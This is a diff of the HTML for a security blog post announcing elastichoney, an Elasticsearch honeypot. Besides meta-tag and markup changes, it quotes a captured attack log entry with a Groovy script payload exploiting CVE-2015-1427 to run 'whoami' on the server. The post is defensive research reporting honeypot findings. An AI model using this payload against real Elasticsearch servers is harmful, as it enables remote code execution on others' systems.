@@ -6,9 +6,14 @@
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 
-  <meta property="og:title" content=" Introducing elastichoney - an Elasticsearch Honeypot &middot;  Jordan Wright" />
+  
+  <meta property="og:title" content="Introducing elastichoney - an Elasticsearch Honeypot" />
+  <meta property="twitter:title" content="Introducing elastichoney - an Elasticsearch Honeypot" />
+  
   <meta property="og:site_name" content="Jordan Wright" />
   <meta property="og:url" content="https://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/" />
+  <meta property="twitter:url" content="https://jordan-wright.com/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">
+
 
   
   <meta property="og:type" content="article" />
@@ -22,10 +27,15 @@
   
   <meta property="og:article:tag" content="honeypot" />
   
+
+  
+
+  
+
   
 
   <title>
-     Introducing elastichoney - an Elasticsearch Honeypot &middot;  Jordan Wright
+     Introducing elastichoney - an Elasticsearch Honeypot 
   </title>
 
   <meta name="description" content="Security and Programming Blog" />
@@ -37,6 +47,7 @@
   <link rel="apple-touch-icon" href="https://jordan-wright.com/blog/images/apple-touch-icon.png" />
 
   <link rel="stylesheet" type="text/css" href="/blog/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/blog/css/highlight.css" />
   <link rel="stylesheet" type="text/css" href="https://jordan-wright.com/blog/css/nav.css" />
   <link rel="stylesheet" type="text/css"
     href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata" />
@@ -181,22 +192,22 @@
 <p>Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&rsquo;ve seen approx. 2000 attacks from over 60 unique IP&rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.</p>
 
 <p>Here&rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#888">{</span>
-    <span style="color:#2838b0">&#34;source&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;@timestamp&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;2015-03-23T13:34:22.519890008-05:00&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;url&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]:9200/_search?pretty&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;method&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;POST&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;form&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;pretty=&amp;{\&#34;script_fields\&#34;:+{\&#34;iswin\&#34;:+{\&#34;lang\&#34;:+\&#34;groovy\&#34;,+\&#34;script\&#34;:+\&#34;java.lang.Math.class.forName(\\\&#34;java.io.BufferedReader\\\&#34;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&#34;java.io.InputStreamReader\\\&#34;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&#34;java.lang.Runtime\\\&#34;).getRuntime().exec(\\\&#34;whoami\\\&#34;).\\tgetInputStream())).readLines()\&#34;}},+\&#34;size\&#34;:+1}=&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;payload&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;headers&#34;</span><span style="color:#888">:</span> <span style="color:#888">{</span>
-        <span style="color:#2838b0">&#34;user_agent&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&#34;</span><span style="color:#888">,</span>
-        <span style="color:#2838b0">&#34;host&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]:9200&#34;</span><span style="color:#888">,</span>
-        <span style="color:#2838b0">&#34;content_type&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#888">,</span>
-        <span style="color:#2838b0">&#34;accept_language&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;&#34;</span>
-    <span style="color:#888">},</span>
-    <span style="color:#2838b0">&#34;type&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;attack&#34;</span><span style="color:#888">,</span>
-    <span style="color:#2838b0">&#34;honeypot&#34;</span><span style="color:#888">:</span> <span style="color:#b83838">&#34;[redacted]&#34;</span>
-<span style="color:#888">}</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
+    <span class="nt">&#34;source&#34;</span><span class="p">:</span> <span class="s2">&#34;[redacted]&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;@timestamp&#34;</span><span class="p">:</span> <span class="s2">&#34;2015-03-23T13:34:22.519890008-05:00&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;url&#34;</span><span class="p">:</span> <span class="s2">&#34;[redacted]:9200/_search?pretty&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;form&#34;</span><span class="p">:</span> <span class="s2">&#34;pretty=&amp;{\&#34;script_fields\&#34;:+{\&#34;iswin\&#34;:+{\&#34;lang\&#34;:+\&#34;groovy\&#34;,+\&#34;script\&#34;:+\&#34;java.lang.Math.class.forName(\\\&#34;java.io.BufferedReader\\\&#34;).getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\&#34;java.io.InputStreamReader\\\&#34;).getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\&#34;java.lang.Runtime\\\&#34;).getRuntime().exec(\\\&#34;whoami\\\&#34;).\\tgetInputStream())).readLines()\&#34;}},+\&#34;size\&#34;:+1}=&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;payload&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;headers&#34;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&#34;user_agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;host&#34;</span><span class="p">:</span> <span class="s2">&#34;[redacted]:9200&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;content_type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+        <span class="nt">&#34;accept_language&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
+    <span class="p">},</span>
+    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;attack&#34;</span><span class="p">,</span>
+    <span class="nt">&#34;honeypot&#34;</span><span class="p">:</span> <span class="s2">&#34;[redacted]&#34;</span>
+<span class="p">}</span></code></pre></div>
 <p>Now, I&rsquo;m sure you&rsquo;re interested in some samples. <a href="https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log">Here&rsquo;s</a> a bit of what I have so far. There&rsquo;s some nifty <code>wget</code> calls in there if you grab them fast enough.</p>
 
 <p>Enjoy!</p>
@@ -238,7 +249,7 @@
 <section class="author">
   <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
   
-  <p>Security Researcher, Programmer.</p>
+  <p>Security Researcher, Open-Source Developer.</p>
   
   <div class="author-meta">
     <span class="author-location icon-location">San Antonio, Texas</span>
@@ -269,18 +280,6 @@
 
     
 
-<div id="disqus_thread"></div>
-<script type="text/javascript">
-  var disqus_shortname = 'jordan-wright';
-  var disqus_url = 'https:\/\/jordan-wright.com\/blog\/2015\/03\/23\/introducing-elastichoney-an-elasticsearch-honeypot\/';
-  (function() {
-    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-  })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
 
 
 
@@ -288,12 +287,6 @@
 </article>
 
 </main>
-    <footer class="site-footer clearfix">
-        <section class="copyright"><a href="">Jordan Wright</a> </section>
-        
-        <section class="poweredby">Proudly generated by <a class="icon-hugo" href="http://gohugo.io">HUGO</a>, with <a class="icon-theme" href="https://github.com/vjeantet/hugo-theme-casper">Casper</a> theme</section>
-        
-    </footer>
     </div>
     <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.js"></script>
     <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.fitvids.js"></script>
